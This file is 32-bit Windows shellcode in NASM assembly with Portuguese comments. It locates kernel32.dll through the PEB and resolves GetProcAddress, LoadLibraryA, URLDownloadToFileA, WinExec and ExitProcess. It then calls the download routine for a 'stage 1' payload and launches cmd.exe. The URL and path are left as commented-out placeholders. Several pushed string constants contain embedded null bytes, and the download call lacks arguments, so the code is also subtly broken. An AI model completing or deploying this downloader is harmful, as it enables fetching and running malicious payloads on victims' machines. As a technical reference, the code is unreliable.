[BITS 32]

xor eax, eax            ; limpa o registrador eax
mov eax, [fs:0x30]      ; eax apontando para o inicio da PEB
mov eax, [eax + 0x0c]   ; CORRIGIDO: mudado de , para + (aponta para PEB_LDR_DATA)
mov ebx, [eax + 0x14]   ; EBX aponta para a lista de módulos (primeiro módulo)
mov ebx, [ebx]          ; Pula do executável principal para a ntdll.dll
mov ebx, [ebx]          ; Pula da ntdll.dll para a kernel32.dll
mov edx, [ebx + 0x10]   ; EDX agora guarda o Endereço Base dinâmico da kernel32.dll!

; --- LOCALIZAR A TABELA DE EXPORTAÇÃO (EAT) ---
mov     eax, [edx + 0x3c]       ; RVA do cabeçalho PE (Offset DOS to NT header)
mov     ecx, [edx + eax + 0x78] ; RVA da Export Table Data Directory
add     ecx, edx                ; Endereço real da Export Table (Data Directory)
mov     eax, [ecx + 0x20]       ; RVA da Address of Names (Tabela de Nomes)
add     eax, edx                ; Endereço real da Address of Names
mov     [esp + 0x4], eax        ; Salva o endereço da Tabela de Nomes na pilha temporariamente

; ---  CONFIGURAR OS CONTADORES DO LOOP ---
xor     ebx, ebx             ; EBX será o nosso contador de índice (0, 1, 2...)

.proxima_funcao:
mov     eax, [esp + 0x4]     ; Recupera o endereço da Tabela de Nomes
mov     eax, [eax + ebx*4]   ; Pega o RVA do nome da função atual no índice EBX
add     eax, edx             ; Endereço real do texto do nome da função

; --- CHECAR SE A FUNÇÃO É A "GetProcAddress" ---
cmp     dword [eax], 0x50746547       ; Compara os primeiros 4 bytes com "GetP"
jnz     .incrementar_index            ; Se não for igual, pula para a próxima
cmp     dword [eax + 0x4], 0x41636f72  ; Compara os próximos 4 bytes com "rocA"
jnz     .incrementar_index            ; Se não for igual, pula para a próxima

; ---  EXTRAIR O ENDEREÇO REAL DA FUNÇÃO ---
mov     eax, [ecx + 0x24]       ; RVA da Address of Name Ordinals
add     eax, edx                ; Endereço real da Tabela de Ordinais
movzx   ebx, word [eax + ebx*2] ; Pega o número ordinal da nossa função

mov     eax, [ecx + 0x1c]       ; RVA da Address of Functions (Tabela de Endereços)
add     eax, edx                ; Endereço real da Tabela de Endereços
mov     eax, [eax + ebx*4]      ; Pega o RVA exato da função GetProcAddress
add     eax, edx                ; Soma com o endereço base da DLL.

mov     esi, eax             ; ESI = GetProcAddress
jmp     .busca_concluida     ; Sai do loop

.incrementar_index:
inc     ebx                  ; Soma 1 ao contador (vai para a próxima função da lista)
jmp     .proxima_funcao

.busca_concluida:
push    edx                  ; SALVA o endereço base da kernel32.dll na pilha para uso futuro

; --- BUSCANDO O ENDEREÇO DA LOADLIBRARYA ---
xor eax, eax
push eax              ; Fim da string (null terminator)
push 0x41797261       ; "aryA"
push 0x62694c64       ; "dLib"
push 0x616f4c         ; "Loa"
mov ecx, esp          ; ECX aponta para "LoadLibraryA"

push ecx              ; lpProcName
push edx              ; hModule (kernel32.dll)
call esi              ; GetProcAddress(kernel32, "LoadLibraryA")
mov ebp, eax          ; Guarda o endereço de LoadLibraryA em EBP

; --- CARREGANDO A URLMON.DLL ---
xor eax, eax
push eax              ; Fim da string
push 0x6c6c642e       ; ".dll"
push 0x6e6f6d6c       ; "lmon"
push 0x7275           ; "ur"
mov ecx, esp          ; ECX aponta para "urlmon.dll"

push ecx              ; lpLibFileName
call ebp              ; LoadLibraryA("urlmon.dll")
mov edx, eax          ; EDX agora guarda o endereço base da urlmon.dll na memória!

; --- BUSCANDO URLDOWNLOADTOFILEA ---
xor eax, eax
push eax              ; Fim da string
push 0x41656c69       ; "ileA"
push 0x466f5464       ; "dToF"
push 0x616f6c6e       ; "nloa"
push 0x776f444c       ; "LDow"
push 0x5255           ; "UR"
mov ecx, esp          ; ECX aponta para "URLDownloadToFileA"

push ecx              ; lpProcName
push edx              ; hModule (urlmon.dll)
call esi              ; GetProcAddress(urlmon, "URLDownloadToFileA")
mov ebx, eax          ; EBX agora guarda o endereço da função URLDownloadToFileA!

; ADICIONADO: BUSCANDO O ENDEREÇO DA WINEXEC 

mov     edx, [esp]            ; Recupera o endereço da kernel32.dll que salvamos na pilha
xor     eax, eax
push    eax                   ; Fim da string
push    0x63657845            ; "xEc" (com o zero implícito à esquerda)
push    0x6e6957              ; "Win"
mov     ecx, esp              ; ECX aponta para "WinExec"

push    ecx                   ; lpProcName
push    edx                   ; hModule (kernel32.dll)
call    esi                   ; GetProcAddress(kernel32, "WinExec")
mov     edi, eax              ; COPIA o endereço da WinExec de EAX para EDI! Now 'call edi' works.

; --- EXECUTANDO O DOWNLOAD (Estágio 1) ---
; [!] Certifique-se de que os registradores abaixo apontam para strings válidas na sua memória real
; ECX = Ponteiro para a URL
; EDI_STR = Ponteiro para o caminho de saída (Temporariamente use suas strings de teste)
; Nota: Como usamos EDI para armazenar a WinExec, certifique-se de usar outro registrador para a string!

xor eax, eax
push eax              ; Argumento 5: lpfnCB = NULL (0)
push eax              ; Argumento 4: dwReserved = 0
; push edi_str        ; Argumento 3: szFileName (Substitua por um registrador contendo o texto do caminho)
; push ecx            ; Argumento 2: szURL (Substitua pelo registrador contendo a URL)
push eax              ; Argumento 1: pCaller = NULL (0)
call ebx              ; Executa URLDownloadToFileA!

; --- BUSCANDO EXITPROCESS ---
mov     edx, [esp]            ; Recupera novamente a kernel32.dll da pilha
xor eax, eax          ; Limpa EAX
push eax              ; Empilha o zero para garantir o fim da string
push 0x73736563       ; Empilha "cess"
push 0x6f725074       ; Empilha "tPro"
push 0x697845         ; Empilha "Exi"
mov ecx, esp          ; ECX agora guarda o endereço do texto "ExitProcess"

push ecx              ; lpProcName
push edx              ; hModule (kernel32.dll)
call esi              ; GetProcAddress(kernel32, "ExitProcess")
mov ebx, eax          ; Salva o endereço da ExitProcess em EBX para usar depois.

; --- EXECUTA O COMANDO LOCAL (Ex: "cmd.exe") ---
xor eax, eax
push eax
push 0x6578652e       ; ".exe"
push 0x646d63         ; "cmd"
mov ecx, esp          ; ECX aponta para "cmd.exe"

push 1                ; Segundo argumento do WinExec: uCmdShow (1 = SW_SHOWNORMAL)
push ecx              ; Primeiro argumento do WinExec: lpCmdLine (ponteiro para "cmd.exe")
call edi              ; EXECUTA WinExec("cmd.exe", 1) - EDI agora tem o endereço correto!

; --- FECHA O PROGRAMA ALVO DE FORMA LIMPA ---
xor eax, eax
push eax              ; Argumento do ExitProcess: uExitCode (0)
call ebx              ; EXECUTA ExitProcess(0)
